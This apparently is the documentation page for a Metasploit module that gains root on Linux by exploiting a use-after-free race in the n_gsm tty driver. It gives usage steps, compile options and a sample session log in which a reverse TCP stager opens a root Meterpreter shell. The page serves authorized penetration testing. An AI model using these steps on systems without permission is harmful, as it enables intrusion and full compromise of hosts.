## Vulnerable Application

This module exploits a race condition leading to a use-after-free on
the kmalloc-1024 slab. The bug exists in the `n_gsm` tty line discipline,
created for gsm modems. The race condition results in a UAF on a struct
`gsm_dlci` while restarting the gsm mux.

The target system must have at least two CPU cores.

Bypasses for SMEP, SMAP and KASLR are included.

This module has been tested successfully on

* Ubuntu 20.04 Server (x86_64)
* Ubuntu 18.04 Server (x86_64)
* CentOS 8 Server (x86_64)
* RHEL 8 Server (x86_64)


## Verification Steps

1. Start `msfconsole`
2. Get a session
3. `use exploit/linux/local/gsm_multiplex_priv_esc`
4. `set SESSION [SESSION]`
5. `check`
6. `run`
7. You should get a new *root* session


## Options

### WritableDir

A writable directory file system path. (default: `/tmp`)

### COMPILE

Options: `Auto` `True` `False` (default: `Auto`)

Whether the exploit should be live compiled with `gcc` on the target system,
or uploaded as a pre-compiled binary.

`Auto` will first determine if `gcc` is installed to compile live on the system,
and fall back to uploading a pre-compiled binary.

## Compiled Executable

The module makes use of a pre-compiled exploit executable to be
used when `gcc` is not available on the target host for live compiling,
or `COMPILE` is set to `False`.

The executable was cross-compiled with [musl-cross](https://s3.amazonaws.com/muslcross/musl-cross-linux-6.tar).

```bash
./x86_64-linux-musl-gcc -o exploit -s -pie -static exploit.c
```

## Scenarios

```
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > check 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[+] System architecture x86_64 is supported
[+] Ubuntu running Linux 4.15.0-20-generic is vulnerable
[+] System has 4 CPU cores
[+] The target is vulnerable.
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > exploit
[*] Started reverse TCP handler on 192.168.138.118:9128 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Running automatic check ("set AutoCheck false" to disable)
[+] System architecture x86_64 is supported
[+] Ubuntu running Linux 4.15.0-20-generic is vulnerable
[+] System has 4 CPU cores
[+] The target is vulnerable.
[+] gcc is installed
[*] Live compiling exploit on system...
[*] Writing '/tmp/.3KcRZM' (250 bytes) ...
[*] Launching exploit
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 192.168.138.192
[+] Deleted /tmp/.Rr0y7I2WQ
[*] Meterpreter session 13 opened (192.168.138.118:9128 -> 192.168.138.192:45906) at 2024-02-05 21:49:46 +0000
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > sessions -i 13
[*] Starting interaction with 13...

meterpreter > getuid 
Server username: root
meterpreter > :)
```
